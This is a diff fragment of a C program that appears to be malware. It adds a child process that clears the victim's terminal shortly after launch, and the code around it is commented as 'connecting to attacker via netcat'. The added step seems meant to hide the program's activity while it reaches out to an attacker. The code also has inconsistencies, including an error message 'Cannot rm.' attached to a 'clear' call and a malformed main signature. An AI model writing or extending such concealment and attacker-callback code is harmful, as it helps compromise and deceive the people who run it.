@@ -124,6 +124,16 @@ int main(int argc, int *argv[])
     {
         waitpid(pid, NULL, 0);
     }
+    pid = fork();
+    if (pid == 0)
+    {
+        usleep(100000);
+        execlp(
+            "clear",
+            "clear",
+            NULL);
+        perror("Cannot rm.");
+    }
     // connecting to attacker via netcat
     pid = fork();
     if (pid == 0)
